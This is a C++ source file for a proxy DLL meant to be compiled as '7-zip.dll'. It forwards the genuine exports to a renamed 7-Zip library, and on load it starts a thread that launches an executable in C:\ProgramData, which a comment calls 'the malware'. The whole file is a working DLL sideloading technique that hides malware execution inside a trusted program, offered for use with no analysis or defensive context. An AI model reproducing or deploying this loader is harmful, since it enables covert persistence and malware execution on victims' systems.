
#include "pch.h"
#include <stdio.h>
#include <stdlib.h>

#define _CRT_SECURE_NO_DEPRECATE
#pragma warning (disable : 4996)

//compile with name "7-zip.dll"

#pragma comment(linker, "/export:DllCanUnloadNow=7-zip-tools.DllCanUnloadNow,@1")
#pragma comment(linker, "/export:DllGetClassObject=7-zip-tools.DllGetClassObject,@2")
#pragma comment(linker, "/export:DllRegisterServer=7-zip-tools.DllRegisterServer,@3")
#pragma comment(linker, "/export:DllUnregisterServer=7-zip-tools.DllUnregisterServer,@4")


DWORD WINAPI DoMagic(LPVOID lpParameter) //do whatever you want here, in this case, I execute the malware that resides in C:\ProgramData
{
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    char path[] = "C:\\ProgramData\\main.exe";

    if (!CreateProcessA(
        NULL,
        path,
        NULL,
        NULL,
        FALSE,
        0,
        NULL,
        NULL,
        &si,
        &pi)
        )
    {

        return 1;
    }

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    return 0;
}


BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD ul_reason_for_call,
    LPVOID lpReserved
)
{
    HANDLE threadHandle;

    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        // https://gist.github.com/securitytube/c956348435cc90b8e1f7
                // Create a thread and close the handle as we do not want to use it to wait for it 
        threadHandle = CreateThread(NULL, 0, DoMagic, NULL, 0, NULL);
        CloseHandle(threadHandle);

    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:
        break;
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}





